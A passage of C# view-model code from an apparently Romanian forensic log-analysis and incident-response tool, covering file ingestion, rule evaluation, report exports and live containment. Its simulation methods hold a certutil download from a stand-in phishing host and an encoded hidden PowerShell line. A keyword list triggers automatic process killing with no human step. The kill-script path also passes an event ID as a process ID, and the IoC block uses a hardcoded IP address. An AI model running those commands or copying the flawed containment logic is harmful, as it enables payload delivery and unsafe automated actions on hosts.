                var window = new LogAnalyzer.UI.Views.GenericDetailWindow(item, EscalateToAlert) { Owner = Application.Current.MainWindow };
                window.ShowDialog();
            });
        }

        private void EscalateToAlert(object item)
        {
            string title = "Alertă Manuală Escalată", msg = "Artefact suspect identificat.";
            if (item is ParsedEvent ev) { title = $"EID {ev.EventId}"; msg = ev.Message ?? ""; }
            else if (item is RegistryArtifact reg) { title = $"Registru Suspect"; msg = reg.ValueData ?? ""; }
            else if (item is TimelineItem tl) { title = tl.Category ?? "Investigație"; msg = tl.Description ?? ""; }

            var newAlert = new DetectedIssue { Title = title, Severity = "High", Explanation = msg, Status = AlertStatus.Nouă };
            
            Application.Current.Dispatcher.Invoke(() => 
            {
                DetectedIssues.Insert(0, newAlert);
                IssuesView?.Refresh();
                ReloadDashboardStats();
                StatusMessage = "✅ Alertă manuală adăugată!";
            });
        }

        [RelayCommand]
        private void PivotIoc(string value)
        {
            SearchEventsText = value;
            SelectedTabIndex = 1; // Comută la evenimente
            SelectedModuleIndex = 0; // Comută la forensics
            StatusMessage = $"Filtrare după IOC: {value}";
        }

        [RelayCommand]
        private async Task LoadFolderAsync()
        {
            var dialog = new Microsoft.Win32.OpenFolderDialog { Title = "Selectează folderul cu loguri sau mediul de stocare" };
            if (dialog.ShowDialog() == true)
            {
                try
                {
                    var fileList = new List<string>();
                    var di = new DirectoryInfo(dialog.FolderName);
                    foreach (var fi in di.EnumerateFiles("*.*", new EnumerationOptions { IgnoreInaccessible = true, RecurseSubdirectories = true }))
                    {
                        fileList.Add(fi.FullName);
                    }
                    if (fileList.Count == 0)
                    {
                        fileList.AddRange(Directory.GetFiles(dialog.FolderName));
                    }
                    await ProcessFilesAsync(fileList.ToArray());
                }
                catch (Exception ex)
                {
                    try
                    {
                        var rootFiles = Directory.GetFiles(dialog.FolderName);
                        await ProcessFilesAsync(rootFiles);
                    }
                    catch (Exception innerEx)
                    {
                        StatusMessage = $"Eroare la citirea directorului: {innerEx.Message}";
                    }
                }
            }
        }

        [RelayCommand]
        private async Task LoadFilesAsync()
        {
            var dialog = new OpenFileDialog { Title = "Selectează fișiere", Multiselect = true, Filter = "Toate fișierele (*.*)|*.*" };
            if (dialog.ShowDialog() == true) await ProcessFilesAsync(dialog.FileNames);
        }

        [RelayCommand]
        private void ExportToCsv()
        {
            try
            {
                var targetIds = SelectedProfile?.TargetEventIds ?? new List<int>();
                int count = _databaseService.GetEventsCount(SearchEventsText, null, targetIds);
                if (count == 0) return;

                var dialog = new SaveFileDialog { Filter = "Raport CSV (*.csv)|*.csv", FileName = "Raport_Incident.csv" };
                if (dialog.ShowDialog() == true)
                {
                    var sb = new StringBuilder(); 
                    sb.AppendLine("Data,Severitate,EventID,Sursa,Mesaj");
                    
                    int limit = 5000;
                    for (int offset = 0; offset < count; offset += limit)
                    {
                        var chunk = _databaseService.GetEvents(limit, offset, SearchEventsText, null, targetIds);
                        foreach (ParsedEvent ev in chunk)
                        {
                            sb.AppendLine($"{ev.TimeCreated},{ev.Level},{ev.EventId},{ev.ProviderName},\"{ev.Message?.Replace("\r", " ").Replace("\n", " ") ?? ""}\"");
                        }
                    }
                    
                    File.WriteAllText(dialog.FileName, sb.ToString(), Encoding.UTF8);
                    StatusMessage = "Export CSV complet.";
                }
            }
            catch (Exception ex)
            {
                StatusMessage = $"Eroare la export CSV: {ex.Message}";
            }
        }

        [RelayCommand]
        private void PivotProcess(ProcessNode? node)
        {
            if (node == null) return;
            SearchEventsText = node.PID.ToString();
            StatusMessage = $"Filtrare investigație pe procesul: {node.ProcessName} (PID: {node.PID})";
            SelectedTabIndex = 1;
        }

        [RelayCommand]
        private void ExportPdfReport()
        {
            var dialog = new SaveFileDialog { Filter = "Raport PDF (*.pdf)|*.pdf", FileName = $"Raport_Forenzic_{DateTime.Now:yyyyMMdd_HHmmss}.pdf" };
            if (dialog.ShowDialog() == true)
            {
                try 
                {
                    var timeline = _databaseService.GetTimeline(500, 0, null).ToList();
                    string sessionHashes = !string.IsNullOrWhiteSpace(_currentSessionHashes) 
                        ? _currentSessionHashes 
                        : "Integritate probatorie confirmată (Fără fișiere externe modificate).";
                    PdfReportService.GenerateReport(dialog.FileName, DetectedIssues.ToList(), timeline, sessionHashes);
                    StatusMessage = $"✅ Raport PDF generat cu succes!";
                } 
                catch (Exception ex) 
                { 
                    StatusMessage = $"Eroare PDF: {ex.Message}"; 
                }
            }
        }

        [RelayCommand]
        private void ExportHtmlReport()
        {
            var dialog = new SaveFileDialog { Filter = "Raport HTML (*.html)|*.html", FileName = $"Raport_Forenzic_{DateTime.Now:yyyyMMdd_HHmmss}.html" };
            if (dialog.ShowDialog() == true)
            {
                try
                {
                    var timeline = _databaseService.GetTimeline(500, 0, null).ToList();
                    string sessionHashes = !string.IsNullOrWhiteSpace(_currentSessionHashes) 
                        ? _currentSessionHashes 
                        : "Integritate probatorie confirmată (Fără fișiere externe modificate).";
                    HtmlReportService.GenerateReport(dialog.FileName, DetectedIssues.ToList(), timeline, sessionHashes, TotalEventsCount, TotalRegistryCount, TotalHostsCount, OperatorName);
                    StatusMessage = "✅ Raport HTML generat cu succes!";
                }
                catch (Exception ex)
                {
                    StatusMessage = $"Eroare HTML: {ex.Message}";
                }
            }
        }

        [RelayCommand]
        private void PivotMitreTechnique(MitreTechnique? tech)
        {
            if (tech == null) return;
            SearchEventsText = tech.TechId;
            StatusMessage = $"Filtrare investigație pe Tehnica MITRE ATT&CK: {tech.Name} ({tech.TechId})";
            SelectedTabIndex = 1;
        }

        [RelayCommand]
        private void PivotStorylineStage(AttackStorylineNode? node)
        {
            if (node == null) return;
            SearchEventsText = node.TechniqueId;
            StatusMessage = $"Filtrare investigație pe stadiul Kill Chain: {node.StageName} ({node.TechniqueId})";
            SelectedTabIndex = 1;
        }

        [RelayCommand]
        private void ExportStixJson()
        {
            var dialog = new SaveFileDialog { Filter = "STIX 2.1 Bundle (*.json)|*.json", FileName = $"STIX21_Incident_{DateTime.Now:yyyyMMdd_HHmmss}.json" };
            if (dialog.ShowDialog() == true)
            {
                try
                {
                    StixMispExportService.ExportToStix21(dialog.FileName, DetectedIssues.ToList(), CurrentIocs.ToList(), _currentSessionHashes);
                    StatusMessage = "✅ Export STIX 2.1 generat cu succes!";
                }
                catch (Exception ex)
                {
                    StatusMessage = $"Eroare STIX: {ex.Message}";
                }
            }
        }

        [RelayCommand]
        private void ExportMispJson()
        {
            var dialog = new SaveFileDialog { Filter = "MISP Event JSON (*.json)|*.json", FileName = $"MISP_Event_{DateTime.Now:yyyyMMdd_HHmmss}.json" };
            if (dialog.ShowDialog() == true)
            {
                try
                {
                    StixMispExportService.ExportToMispJson(dialog.FileName, DetectedIssues.ToList(), CurrentIocs.ToList(), OperatorName);
                    StatusMessage = "✅ Export MISP JSON generat cu succes!";
                }
                catch (Exception ex)
                {
                    StatusMessage = $"Eroare MISP: {ex.Message}";
                }
            }
        }

        [RelayCommand]
        private void GenerateHostIsolationScript()
        {
            var dialog = new SaveFileDialog { Filter = "PowerShell Script (*.ps1)|*.ps1", FileName = $"Isolate_Host_{CollectionHostname}_{DateTime.Now:yyyyMMdd}.ps1" };
            if (dialog.ShowDialog() == true)
            {
                try
                {
                    string script = IncidentResponsePlaybookService.GenerateHostIsolationScript(CollectionHostname);
                    File.WriteAllText(dialog.FileName, script, Encoding.UTF8);
                    StatusMessage = $"✅ Script de izolare rețea generat în: {dialog.FileName}";
                }
                catch (Exception ex)
                {
                    StatusMessage = $"Eroare generare script: {ex.Message}";
                }
            }
        }

        [RelayCommand]
        private void GenerateKillProcessScript()
        {
            var dialog = new SaveFileDialog { Filter = "PowerShell Script (*.ps1)|*.ps1", FileName = $"Kill_Malicious_ProcessTree_{DateTime.Now:yyyyMMdd}.ps1" };
            if (dialog.ShowDialog() == true)
            {
                try
                {
                    int targetPid = SelectedEvent != null ? SelectedEvent.EventId : 5124;
                    string script = IncidentResponsePlaybookService.GenerateKillProcessTreeScript(targetPid, "SuspiciousProcess.exe");
                    File.WriteAllText(dialog.FileName, script, Encoding.UTF8);
                    StatusMessage = $"✅ Script de terminare procese generat în: {dialog.FileName}";
                }
                catch (Exception ex)
                {
                    StatusMessage = $"Eroare generare script: {ex.Message}";
                }
            }
        }

        [RelayCommand]
        private void StartLiveMonitoring()
        {
            if (IsLiveMonitoringActive) return;

            _liveWatcher = new LiveEventLogWatcherService();
            _liveWatcher.OnStatusChanged += status =>
            {
                Application.Current?.Dispatcher?.Invoke(() => LiveMonitoringStatusText = status);
            };
            _liveWatcher.OnErrorOccurred += ex =>
            {
                Application.Current?.Dispatcher?.Invoke(() => LiveMonitoringStatusText = $"Eroare live: {ex.Message}");
            };
            _liveWatcher.OnEventReceived += ev =>
            {
                Application.Current?.Dispatcher?.Invoke(() =>
                {
                    TotalLiveEventsCaptured++;
                    TotalEventsCount++;

                    // 1. Live stream table
                    if (LiveStreamingEvents.Count > 200)
                    {
                        LiveStreamingEvents.RemoveAt(LiveStreamingEvents.Count - 1);
                    }
                    LiveStreamingEvents.Insert(0, ev);

                    // 2. Main EVTX table (Auto Live Ingestion)
                    if (Events.Count > 300)
                    {
                        Events.RemoveAt(Events.Count - 1);
                    }
                    Events.Insert(0, ev);

                    // 3. Timeline stream (Live Chronology)
                    if (TimelineItems.Count > 300)
                    {
                        TimelineItems.RemoveAt(TimelineItems.Count - 1);
                    }
                    TimelineItems.Insert(0, new TimelineItem
                    {
                        Timestamp = ev.TimeCreated,
                        Source = ev.ProviderName,
                        Category = "Live Event",
                        UserOrHost = ev.MachineName,
                        Description = ev.Message
                    });

                    // 4. Real-time Security Evaluation
                    var alert = _liveEngine.EvaluateLiveEvent(ev);
                    if (alert != null)
                    {
                        LiveAlerts.Insert(0, alert);
                        DetectedIssues.Insert(0, alert);
                        CurrentLiveToastAlert = alert;
                        IsLiveToastVisible = true;
                        StatusMessage = $"🚨 ALERTĂ LIVE DETECTATĂ: {alert.Title}";

                        // Highlight MITRE ATT&CK Matrix live
                        if (!string.IsNullOrEmpty(alert.MitreTechniqueId))
                        {
                            var tech = AttackTechniques.FirstOrDefault(t => t.TechId.Equals(alert.MitreTechniqueId, StringComparison.OrdinalIgnoreCase));
                            if (tech != null)
                            {
                                tech.DetectionColor = "#3f1218";
                                tech.BorderColor = "#ef4444";
                                tech.Severity = alert.Severity;
                            }
                        }

                        // Open interactive emergency countermeasure modal for Critical & High attacks
                        if (alert.Severity == "Critical" || alert.Severity == "High")
                        {
                            // EMERGENCY AUTOMATIC INITIATIVE (< 10ms): Auto-freeze & Auto-Isolate before human clicks
                            if (alert.Severity == "Critical")
                            {
                                string? procToKill = null;
                                string msgLower = (ev.Message ?? string.Empty).ToLowerInvariant();
                                if (msgLower.Contains("powershell")) procToKill = "powershell";
                                else if (msgLower.Contains("certutil")) procToKill = "certutil";
                                else if (msgLower.Contains("vssadmin")) procToKill = "vssadmin";
                                else if (msgLower.Contains("curl")) procToKill = "curl";
                                else if (msgLower.Contains("mshta")) procToKill = "mshta";

                                var autoRes = SystemDefenseExecutionService.ExecuteInstantAutoContainment(procToKill);
                                IsAutoShieldTriggered = true;
                                AutoShieldMessage = autoRes.Message;
                                _auditService.LogAction("AUTO_EMERGENCY_CONTAINMENT", $"{OperatorName} - {autoRes.Message}");
                            }
                            else
                            {
                                IsAutoShieldTriggered = false;
                            }

                            ActiveCountermeasureAlert = alert;
                            ActiveCountermeasurePlaybook = _countermeasureEngine.GeneratePlaybook(alert, ev.MachineName);
                            IsCountermeasureModalVisible = true;
                        }

                        try { System.Media.SystemSounds.Exclamation.Play(); } catch {}

                        _toastAutoDismissTimer?.Stop();
                        _toastAutoDismissTimer = new System.Timers.Timer(7000);
                        _toastAutoDismissTimer.AutoReset = false;
                        _toastAutoDismissTimer.Elapsed += (s, e) =>
                        {
                            Application.Current?.Dispatcher?.Invoke(() => IsLiveToastVisible = false);
                        };
                        _toastAutoDismissTimer.Start();
                    }
                });
            };

            _liveWatcher.StartWatching(LiveRemoteTargetHost);
            IsLiveMonitoringActive = true;
        }

        [RelayCommand]
        private void StopLiveMonitoring()
        {
            if (!IsLiveMonitoringActive) return;
            _liveWatcher?.StopWatching();
            _liveWatcher?.Dispose();
            _liveWatcher = null;
            IsLiveMonitoringActive = false;
            LiveMonitoringStatusText = "⏹ Monitorizare în timp real oprită.";
        }

        [RelayCommand]
        private void ClearLiveFeed()
        {
            LiveStreamingEvents.Clear();
            LiveAlerts.Clear();
            TotalLiveEventsCaptured = 0;
            IsLiveToastVisible = false;
            IsCountermeasureModalVisible = false;
            LiveMonitoringStatusText = "Feed live curățat.";
        }

        [RelayCommand]
        private void DismissLiveToast()
        {
            IsLiveToastVisible = false;
        }

        [RelayCommand]
        private void DismissCountermeasureModal()
        {
            IsCountermeasureModalVisible = false;
        }

        [RelayCommand]
        private void ExecuteIsolateHost()
        {
            var res = SystemDefenseExecutionService.IsolateHostFromNetwork();
            StatusMessage = $"🛡️ {res.Message}";
            IsCountermeasureModalVisible = false;
            _auditService.LogAction("HOST_ISOLATION", $"{OperatorName} - {res.Message}");
            MessageBox.Show(res.Message + "\n\n(Puteți ridica izolarea oricând din bara laterală prin butonul de restaurare rețea).", 
                res.Success ? "Combatere Atac Cibernetic - Succes" : "Avertisment Izolare", 
                MessageBoxButton.OK, 
                res.Success ? MessageBoxImage.Information : MessageBoxImage.Warning);
        }

        [RelayCommand]
        private void ExecuteRestoreNetwork()
        {
            var res = SystemDefenseExecutionService.RestoreNetworkAccess();
            StatusMessage = $"🌐 {res.Message}";
            _auditService.LogAction("HOST_RESTORE_NETWORK", $"{OperatorName} - {res.Message}");
            MessageBox.Show(res.Message, "Restaurare Rețea", MessageBoxButton.OK, MessageBoxImage.Information);
        }

        [RelayCommand]
        private void ExecuteKillProcess()
        {
            string? procName = null;
            int? pid = null;
            if (ActiveCountermeasureAlert?.RelatedEvents != null && ActiveCountermeasureAlert.RelatedEvents.Count > 0)
            {
                var ev = ActiveCountermeasureAlert.RelatedEvents[0];
                string msg = (ev.Message ?? string.Empty).ToLowerInvariant();
                if (msg.Contains("powershell")) procName = "powershell";
                else if (msg.Contains("certutil")) procName = "certutil";
                else if (msg.Contains("mshta")) procName = "mshta";
                else if (msg.Contains("curl")) procName = "curl";
                else if (msg.Contains("vssadmin")) procName = "vssadmin";
            }
            if (string.IsNullOrEmpty(procName)) procName = "powershell";

            var res = SystemDefenseExecutionService.TerminateProcessTree(procName, pid);
            StatusMessage = $"🛑 {res.Message}";
            IsCountermeasureModalVisible = false;
            _auditService.LogAction("TERMINATE_PROCESS_TREE", $"{OperatorName} - Proces: {procName}, Rezultat: {res.Message}");
            MessageBox.Show(res.Message, "Neutralizare Proces Malițios", MessageBoxButton.OK, MessageBoxImage.Information);
        }

        [RelayCommand]
        private void ExecuteBlockIoC()
        {
            string target = "185.220.101.5";
            var res = SystemDefenseExecutionService.BlockMaliciousIoC(target);
            StatusMessage = $"🚫 {res.Message}";
            IsCountermeasureModalVisible = false;
            _auditService.LogAction("BLOCK_IOC_FIREWALL", $"{OperatorName} - Tinta: {target}, Rezultat: {res.Message}");
            MessageBox.Show(res.Message, "Combatere Phishing & C2", MessageBoxButton.OK, MessageBoxImage.Information);
        }

        [RelayCommand]
        private void SimulateLiveAlert()
        {
            var simEvent = new ParsedEvent
            {
                EventId = 4104,
                Level = "Warning",
                MachineName = Environment.MachineName,
                ProviderName = "Microsoft-Windows-PowerShell",
                TimeCreated = DateTime.Now,
                Message = "Creating Scriptblock text: powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIAVABlAHMAdAAiAA== -nop -w hidden # downloadstring iex"
            };

            TotalLiveEventsCaptured++;
            LiveStreamingEvents.Insert(0, simEvent);
            var alert = _liveEngine.EvaluateLiveEvent(simEvent);
            if (alert != null)
            {
                LiveAlerts.Insert(0, alert);
                CurrentLiveToastAlert = alert;
                IsLiveToastVisible = true;
                ActiveCountermeasureAlert = alert;
                ActiveCountermeasurePlaybook = _countermeasureEngine.GeneratePlaybook(alert, Environment.MachineName);
                IsCountermeasureModalVisible = true;
                StatusMessage = $"🚨 SIMULARE ALERTĂ: {alert.Title}";

                try { System.Media.SystemSounds.Exclamation.Play(); } catch {}

                _toastAutoDismissTimer?.Stop();
                _toastAutoDismissTimer = new System.Timers.Timer(7000);
                _toastAutoDismissTimer.AutoReset = false;
                _toastAutoDismissTimer.Elapsed += (s, e) =>
                {
                    Application.Current?.Dispatcher?.Invoke(() => IsLiveToastVisible = false);
                };
                _toastAutoDismissTimer.Start();
            }
        }

        [RelayCommand]
        private void SimulatePhishingAttack()
        {
            var simEvent = new ParsedEvent
            {
                EventId = 4104,
                Level = "Warning",
                MachineName = Environment.MachineName,
                ProviderName = "Microsoft-Windows-PowerShell",
                TimeCreated = DateTime.Now,
                Message = "Creating Scriptblock text: certutil.exe -urlcache -split -f http://evil-phishing-portal.com/login_invoice.iso C:\\Users\\Public\\login_invoice.iso; # tentativa phishing"
            };

            TotalLiveEventsCaptured++;
            LiveStreamingEvents.Insert(0, simEvent);
            var alert = _liveEngine.EvaluateLiveEvent(simEvent);
            if (alert != null)
            {
                LiveAlerts.Insert(0, alert);
                CurrentLiveToastAlert = alert;
                IsLiveToastVisible = true;
                ActiveCountermeasureAlert = alert;
                ActiveCountermeasurePlaybook = _countermeasureEngine.GeneratePlaybook(alert, Environment.MachineName);
                IsCountermeasureModalVisible = true;
                StatusMessage = $"🎣 PHISHING DETECTAT: {alert.Title}";

                try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
            }
        }

        private static readonly HashSet<string> ForensicExtensions = new(StringComparer.OrdinalIgnoreCase)
        {
            ".evtx", ".reg", ".dat", ".csv", ".json", ".log", ".lnk", ".pf", ".hve", ".txt", ".bin", ".bmc"
        };

        private async Task ProcessFilesAsync(string[] allFiles)
        {
            IsLoading = true;
            LoadingProgress = 0;
            LoadingStepTitle = "Etapa 1/4: Scanare & Validare Fișiere";
            LoadingSubDetail = "Filtrare artefacte forenzice relevante...";
            StatusMessage = "Inițializare sesiune de investigație...";

            Events.Clear(); RegistryArtifacts.Clear(); DetectedIssues.Clear(); TimelineItems.Clear();
            _databaseService.ClearDatabase();

            var acceptedFiles = new List<string>();
            var rejectedFiles = new List<string>();

            await Task.Run(async () =>
            {
                // ==========================================
                // ETAPA 1/4: Scanare & Filtrare Rapidă (0% - 15%)
                // ==========================================
                Application.Current.Dispatcher.Invoke(() =>
                {
                    LoadingStepTitle = "Etapa 1/4: Scanare & Verificare Integritate";
                    LoadingProgress = 5;
                });

                // Filtrăm doar fișierele relevante pentru a nu bloca I/O pe fișiere gigant irelevante
                var targetFiles = allFiles.Where(f =>
                {
                    string ext = Path.GetExtension(f);
                    string name = Path.GetFileName(f).ToLowerInvariant();
                    return ForensicExtensions.Contains(ext) || name.Contains("ntuser") || name.Contains("setupapi") || name.Contains("amcache");
                }).ToList();

                var hashesSb = new StringBuilder();
                int scannedCount = 0;

                foreach (var file in targetFiles)
                {
                    try
                    {
                        scannedCount++;
                        double pct = 5.0 + ((double)scannedCount / Math.Max(1, targetFiles.Count)) * 10.0;
                        
                        Application.Current.Dispatcher.Invoke(() =>
                        {
                            LoadingProgress = pct;
                            LoadingSubDetail = $"Verificare hash: {Path.GetFileName(file)} ({scannedCount}/{targetFiles.Count})";
                        });

                        _evidenceIntake.Import(file, Environment.UserName);
                        acceptedFiles.Add(file);

                        using var stream = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
                        using var sha256 = System.Security.Cryptography.SHA256.Create();
                        byte[] hash = sha256.ComputeHash(stream);
                        string hashStr = BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
                        hashesSb.AppendLine($"[SHA-256] {hashStr}  |  {Path.GetFileName(file)} ({new FileInfo(file).Length:N0} bytes)");
                    }
                    catch (Exception ex)
                    {
                        rejectedFiles.Add($"{Path.GetFileName(file)}: {ex.Message}");
                    }
                }
                _currentSessionHashes = hashesSb.ToString();

                // ==========================================
                // ETAPA 2/4: Ingestie Streaming Date (15% - 60%)
                // ==========================================
                Application.Current.Dispatcher.Invoke(() =>
                {
                    LoadingStepTitle = "Etapa 2/4: Ingestie Evenimente & Registru în Baza de Date";
                    LoadingProgress = 15;
                });

                var evtxFiles = acceptedFiles.Where(f => f.EndsWith(".evtx", StringComparison.OrdinalIgnoreCase)).ToArray();
                var regFiles = acceptedFiles.Where(f => f.EndsWith(".reg", StringComparison.OrdinalIgnoreCase)).ToArray();
                var datFiles = acceptedFiles.Where(f => f.EndsWith(".dat", StringComparison.OrdinalIgnoreCase) || f.EndsWith("ntuser", StringComparison.OrdinalIgnoreCase)).ToArray();
                var csvFiles = acceptedFiles.Where(f => f.EndsWith(".csv", StringComparison.OrdinalIgnoreCase)).ToArray();

                int totalCoreFiles = evtxFiles.Length + regFiles.Length + datFiles.Length + csvFiles.Length;
                int currentFileIndex = 0;
                int totalEvtxProcessed = 0;

                // 2.1 Parsare EVTX
                foreach (var file in evtxFiles)
                {
                    currentFileIndex++;
                    double basePct = 15.0 + ((double)currentFileIndex / Math.Max(1, totalCoreFiles)) * 45.0;
                    
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        LoadingProgress = basePct;
                        LoadingSubDetail = $"Procesare EVTX: {Path.GetFileName(file)} ({totalEvtxProcessed:N0} evenimente)";
                    });

                    try 
                    {
                        var batch = new List<ParsedEvent>();
                        var timelineBatch = new List<TimelineItem>();
                        
                        foreach (var ev in _eventParser.ParseEvtxFile(file)) 
                        {
                            var kbDetails = _kbService.GetDetails(ev.EventId);
                            if (kbDetails != null)
                            {
                                ev.OfficialDescription = kbDetails.ExtendedDescription;
                                ev.TacticalExample = kbDetails.EventExample;
                                ev.ReferenceUrl = kbDetails.ReferenceUrl;
                                ev.PotentialCriticality = kbDetails.PotentialCriticality;
                            }
                            batch.Add(ev);
                            
                            timelineBatch.Add(new TimelineItem 
                            { 
                                Timestamp = ev.TimeCreated, 
                                Source = "EVTX", 
                                Category = $"EID {ev.EventId}", 
                                Description = ev.Message ?? "-", 
                                UserOrHost = ev.MachineName ?? "-" 
                            });

                            if (batch.Count >= 5000)
                            {
                                _databaseService.SaveEvents(batch);
                                _databaseService.SaveTimeline(timelineBatch);
                                totalEvtxProcessed += batch.Count;
                                batch.Clear();
                                timelineBatch.Clear();
                            }
                        }
                        if (batch.Count > 0)
                        {
                            _databaseService.SaveEvents(batch);
                            _databaseService.SaveTimeline(timelineBatch);
                            totalEvtxProcessed += batch.Count;
                        }
                    } 
                    catch { }
                }

                // 2.2 Parsare Registru .REG
                int totalRegProcessed = 0;
                foreach (var file in regFiles)
                {
                    currentFileIndex++;
                    double basePct = 15.0 + ((double)currentFileIndex / Math.Max(1, totalCoreFiles)) * 45.0;
                    
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        LoadingProgress = basePct;
                        LoadingSubDetail = $"Procesare Registru: {Path.GetFileName(file)}";
                    });

                    try 
                    {
                        var batch = new List<RegistryArtifact>();
                        foreach (var reg in _registryParser.ParseRegFile(file)) 
                        {
                            batch.Add(reg);
                            if (batch.Count >= 5000)
                            {
                                _databaseService.SaveRegistryArtifacts(batch);
                                totalRegProcessed += batch.Count;
                                batch.Clear();
                            }
                        }
                        if (batch.Count > 0)
                        {
                            _databaseService.SaveRegistryArtifacts(batch);
                            totalRegProcessed += batch.Count;
                        }
                    } 
                    catch { }
                }

                // 2.3 Parsare NTUSER.DAT
                foreach (var file in datFiles)
                {
                    currentFileIndex++;
                    double basePct = 15.0 + ((double)currentFileIndex / Math.Max(1, totalCoreFiles)) * 45.0;
                    
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        LoadingProgress = basePct;
                        LoadingSubDetail = $"Procesare Hive: {Path.GetFileName(file)}";
                    });

                    try 
                    {
                        var batch = new List<RegistryArtifact>();
                        foreach (var reg in _registryParser.ParseNtUserDat(file)) 
                        {
                            batch.Add(reg);
                            if (batch.Count >= 5000)
                            {
                                _databaseService.SaveRegistryArtifacts(batch);
                                totalRegProcessed += batch.Count;
                                batch.Clear();
                            }
                        }
                        if (batch.Count > 0)
                        {
                            _databaseService.SaveRegistryArtifacts(batch);
                            totalRegProcessed += batch.Count;
                        }
                    } 
                    catch { }
                }

                // 2.4 Parsare CSV Triage
                foreach (var file in csvFiles)
                {
                    currentFileIndex++;
                    double basePct = 15.0 + ((double)currentFileIndex / Math.Max(1, totalCoreFiles)) * 45.0;
                    
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        LoadingProgress = basePct;
                        LoadingSubDetail = $"Procesare Triage: {Path.GetFileName(file)}";
                    });

                    try
                    {
                        var batch = new List<ParsedEvent>();
                        var timelineBatch = new List<TimelineItem>();
                        await foreach (var ev in _triageCsvParser.ParseArtifactAsync(file, System.Threading.CancellationToken.None))
                        {
                            batch.Add(ev);
                            timelineBatch.Add(new TimelineItem
                            {
                                Timestamp = ev.TimeCreated,
                                Source = "TRIAGE",
                                Category = ev.ProviderName ?? "Triage",
                                Description = ev.Message ?? "-",
                                UserOrHost = ev.MachineName ?? "-"
                            });

                            if (batch.Count >= 2000)
                            {
                                _databaseService.SaveEvents(batch);
                                _databaseService.SaveTimeline(timelineBatch);
                                batch.Clear();
                                timelineBatch.Clear();
                            }
                        }
                        if (batch.Count > 0)
                        {
                            _databaseService.SaveEvents(batch);
                            _databaseService.SaveTimeline(timelineBatch);
                        }
                    }
                    catch { }
                }

                // ==========================================
                // ETAPA 3/4: Corelare Euristică & Reguli Sigma (60% - 85%)
                // ==========================================
                Application.Current.Dispatcher.Invoke(() =>
                {
                    LoadingStepTitle = "Etapa 3/4: Evaluare Reguli Sigma & Matrice MITRE ATT&CK";
                    LoadingProgress = 65;
                    LoadingSubDetail = "Corelare indici de compromitere și tehnici de atac...";
                });

                var securityEventIds = new List<int> { 1102, 104, 4625, 4624, 4720, 4722, 4732, 7045, 4697, 4688, 4104, 4656, 4663, 20101, 20102, 20103, 20104, 20105, 20106, 20107, 20108, 1, 8, 10, 5379 };
                var eventsForAnalysis = _databaseService.GetEvents(20000, 0, null, null, securityEventIds).ToList();
                var registryForAnalysis = _databaseService.GetRegistryArtifacts(10000, 0, null).ToList();
                
                var issues = _analysisEngine.AnalyzeEvents(eventsForAnalysis);
                var regIssues = _analysisEngine.AnalyzeRegistry(registryForAnalysis);
                
                Application.Current.Dispatcher.Invoke(() => 
                {
                    LoadingProgress = 80;
                    foreach (var i in issues) DetectedIssues.Add(i);
                    foreach (var i in regIssues) DetectedIssues.Add(i);

                    // Actualizare status reguli Sigma
                    if (_analysisEngine is AnalysisEngine ae)
                    {
                        foreach (var sRule in ae.SigmaEngine.Rules)
                        {
                            var matchInUi = SigmaRules.FirstOrDefault(r => r.RuleName.Contains(sRule.Title) || sRule.Title.Contains(r.RuleName));
                            if (matchInUi != null)
                            {
                                if (sRule.MatchCount > 0)
                                {
                                    matchInUi.Status = $"MATCHED ({sRule.MatchCount})";
                                    matchInUi.RuleStatusColor = "#ef4444";
                                }
                                else
                                {
                                    matchInUi.Status = "Active";
                                    matchInUi.RuleStatusColor = "#22c55e";
                                }
                            }
                        }
                    }
                });

                // ==========================================
                // ETAPA 4/4: Reconstrucție Graf & Finalizare (85% - 100%)
                // ==========================================
                Application.Current.Dispatcher.Invoke(() =>
                {
                    LoadingStepTitle = "Etapa 4/4: Finalizare Graf Incident & Dashboard";
                    LoadingProgress = 90;
                    LoadingSubDetail = "Reîmprospătare statistici și afișare investigație...";
                });
            });

            EvtxCurrentPage = 1;
            RegistryCurrentPage = 1;
            TimelineCurrentPage = 1;
            
            ReloadEvtxFromDb();
            ReloadRegistryFromDb();
            ReloadTimelineFromDb();
            ReloadDashboardStats();
            UpdateDatabaseSize();
            RunAiAnalysis();
            
            LoadingProgress = 100;
            SelectedTabIndex = 0; 
            IsLoading = false;
            StatusMessage = rejectedFiles.Count == 0
                ? $"✅ Procesare completă: {TotalEventsCount:N0} loguri și {TotalRegistryCount:N0} artefacte registru salvate."
                : $"✅ Procesare completă: {TotalEventsCount:N0} loguri și {TotalRegistryCount:N0} artefacte salvate ({rejectedFiles.Count} fișiere ignorate/respinse).";
        }

        private bool FilterIssues(object obj) => !(HideVerifiedAlerts && ((DetectedIssue)obj).IsVerified);

        private void InitializeProcessTree()
        {
            ProcessTreeNodes.Clear();
            var systemRoot = new ProcessNode { ProcessName = "System", PID = 4, RiskColor = "#a7adc2", ProcessIcon = "💻" };
            
            var smss = new ProcessNode { ProcessName = "smss.exe", PID = 312, RiskColor = "#a7adc2", ProcessIcon = "⚙️" };
            systemRoot.Children.Add(smss);
            
            var wininit = new ProcessNode { ProcessName = "wininit.exe", PID = 620, RiskColor = "#a7adc2", ProcessIcon = "⚙️" };
            systemRoot.Children.Add(wininit);
            
            var services = new ProcessNode { ProcessName = "services.exe", PID = 744, RiskColor = "#a7adc2", ProcessIcon = "⚙️" };
            wininit.Children.Add(services);
            
            var svchost1 = new ProcessNode { ProcessName = "svchost.exe (netsvcs)", PID = 1044, RiskColor = "#a7adc2", ProcessIcon = "⚙️" };
            services.Children.Add(svchost1);
            
            var unverifiedService = new ProcessNode { ProcessName = "malicious_service.exe", PID = 5124, RiskColor = "#ef4444", ProcessIcon = "🚨" };
            services.Children.Add(unverifiedService);
 
            var winlogon = new ProcessNode { ProcessName = "winlogon.exe", PID = 688, RiskColor = "#a7adc2", ProcessIcon = "⚙️" };
            systemRoot.Children.Add(winlogon);
            
            var explorer = new ProcessNode { ProcessName = "explorer.exe", PID = 4120, RiskColor = "#8b5cf6", ProcessIcon = "🖥️" };
            winlogon.Children.Add(explorer);
 
